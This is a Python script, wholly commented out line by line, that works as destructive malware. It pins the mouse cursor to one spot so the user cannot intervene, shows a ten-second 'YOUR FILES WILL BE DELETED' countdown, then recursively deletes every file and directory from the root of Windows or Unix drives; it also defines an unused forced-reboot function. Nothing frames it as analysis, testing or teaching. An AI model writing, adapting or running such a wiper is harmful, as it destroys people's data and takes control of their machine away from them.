################import os
################import time
################import multiprocessing
##############print(nadjpfnauop)
############### Check if pynput is installed
##############try:
##############    from pynput.mouse import Controller
##############    MOUSE_AVAILABLE = True
##############except ImportError:
##############    print("WARNING: 'pynput' library not found. Mouse monitoring will be disabled.")
##############    MOUSE_AVAILABLE = False
##############
############### Check if shutil is available (should be by default)
##############try:
##############    import shutil
##############    SHUTIL_AVAILABLE = True
##############except ImportError:
##############    print("WARNING: 'shutil' not found. Some files may not be deleted.")
##############    SHUTIL_AVAILABLE = False
##############
############### Initialize mouse controller if available
##############if MOUSE_AVAILABLE:
##############    mouse = Controller()
##############    fixed_x, fixed_y = 100, 100
##############
##############def monitor_mouse():
##############    """ Keeps the mouse at a fixed position """
##############    if not MOUSE_AVAILABLE:
##############        return  # Skip if pynput isn't installed
##############
##############    while True:
##############        current_x, current_y = mouse.position
##############        if current_x != fixed_x or current_y != fixed_y:
##############            print(f"Mouse moved! Resetting to ({fixed_x}, {fixed_y})")
##############            mouse.position = (fixed_x, fixed_y)  # Move mouse back
##############        time.sleep(0.1)
##############def restart():
##############    os.system("sudo shutdown -r now")
##############def wipe_drive():
##############    """ Deletes all files on the system """
##############    print("Wiping all files...")
##############
##############    base_dir = "C:\\" if os.name == "nt" else "/"
##############
##############    for root, dirs, files in os.walk(base_dir, topdown=False):
##############        for file in files:
##############            try:
##############                os.remove(os.path.join(root, file))
##############                print(f"Deleted: {os.path.join(root, file)}")
##############            except PermissionError:
##############                print(f"Permission denied: {os.path.join(root, file)}")
##############            except Exception as e:
##############                print(f"Error deleting {file}: {e}")
##############
##############        if SHUTIL_AVAILABLE:
##############            for directory in dirs:
##############                try:
##############                    shutil.rmtree(os.path.join(root, directory))
##############                    print(f"Deleted directory: {os.path.join(root, directory)}")
##############                except PermissionError:
##############                    print(f"Permission denied: {os.path.join(root, directory)}")
##############                except Exception as e:
##############                    print(f"Error deleting directory {directory}: {e}")
##############        else:
##############            print("Skipping directory deletion (shutil not available).")
##############
##############def start_countdown():
##############    """ Countdown before wipe begins """
##############    remaining_time = 10
##############    print("WARNING: YOUR FILES WILL BE DELETED")
##############    for _ in range(10):
##############        print(f"Remaining time: {remaining_time} seconds")
##############        time.sleep(1)
##############        remaining_time -= 1
##############    print("Starting wipe process...")
##############    wipe_drive()
##############
##############if __name__ == "__main__":
##############    # Start mouse monitoring if pynput is available
##############    if MOUSE_AVAILABLE:
##############        mouse_process = multiprocessing.Process(target=monitor_mouse)
##############        mouse_process.start()
##############    else:
##############        mouse_process = None
##############
##############    # Start the countdown
##############    start_countdown()
##############    
##############
##############    # Stop mouse monitoring after wipe
##############    if mouse_process:
##############        mouse_process.terminate()
##############        mouse_process.join()
##############
##############    print("Wipe complete. Program finished.")
##############
##############    
